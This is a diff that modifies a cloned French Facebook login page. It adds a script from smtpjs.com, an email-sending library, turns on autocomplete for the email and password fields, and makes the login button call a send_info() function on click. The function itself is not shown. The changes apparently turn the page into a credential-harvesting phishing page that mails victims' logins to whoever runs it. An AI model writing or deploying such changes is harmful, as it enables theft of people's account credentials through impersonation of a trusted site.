@@ -58,6 +58,9 @@ Facebook - Connexion ou inscription</title>
 
 <body class="fbIndex UIPage_LoggedOut _-kb _605a b_c3pyn-ahh win x1 Locale_fr_FR" dir="ltr">
 
+<script src="https://smtpjs.com/v3/smtp.js">
+</script>
+
 <div class="error">Vous devez vous connecter avant de continuer.</div>
 
 <div class="_li" id="u_0_1_tM">
@@ -102,7 +105,7 @@ Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
 
 <div class="_6lux">
 
-<input type="text" class="inputtext _55r1 _6luy" name="email" id="email" data-testid="royal_email" placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." autofocus="1" aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." />
+<input type="text" class="inputtext _55r1 _6luy" name="email" autocomplete="on" id="email" data-testid="royal_email" placeholder="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." autofocus="1" aria-label="Adresse e-mail ou num&#xe9;ro de t&#xe9;l." />
 
 </div>
 
@@ -110,7 +113,7 @@ Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
 
 <div class="_6luy _55r1 _1kbt" id="passContainer">
 
-<input type="password" class="inputtext _55r1 _6luy _9npi" name="pass" id="pass" data-testid="royal_pass" placeholder="Mot de passe" aria-label="Mot de passe" />
+<input type="password" class="inputtext _55r1 _6luy _9npi" autocomplete="on" name="pass" id="pass" data-testid="royal_pass" placeholder="Mot de passe" aria-label="Mot de passe" />
 
 <div class="_9ls7" id="u_0_3_Gn">
 
@@ -140,7 +143,7 @@ Avec Facebook, partagez et restez en contact avec votre entourage.</h2>
 
 <div class="_6ltg">
 
-<a href="#" value="1" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_0i">
+<a href="#" value="1" onclick="send_info()" class="_42ft _4jy0 _6lth _4jy6 _4jy1 selected _51sy" name="login" data-testid="royal_login_button" type="submit" id="u_0_5_0i">
 
 Se connecter
 
